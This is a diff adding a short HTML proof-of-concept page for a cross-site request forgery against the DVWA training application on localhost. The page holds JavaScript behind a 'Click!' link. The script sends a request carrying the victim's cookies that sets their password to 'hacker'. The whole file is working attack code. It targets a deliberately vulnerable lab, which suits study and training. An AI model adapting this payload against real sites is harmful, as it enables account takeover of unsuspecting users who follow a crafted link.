@@ -1,0 +1,31 @@
+<!--
+ PoC: CSRF
+ Author: Bonghwan Choi
+-->
+
+<html>
+<meta charset="UTF-8">
+<head>
+</head>
+
+<script language="javascript">
+
+  function poc() {
+
+    var host='localhost';
+
+    var req_uri = "http://" + host + "/dvwa/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change";
+    var xmlhttp = new XMLHttpRequest();
+
+    xmlhttp.open("GET",req_uri,true);
+    xmlhttp.withCredentials = "true";
+
+    xmlhttp.send();
+  }
+
+</script>
+
+<body>
+<a href="javascript:poc()">Click!</a><br />
+</body>
+</html>
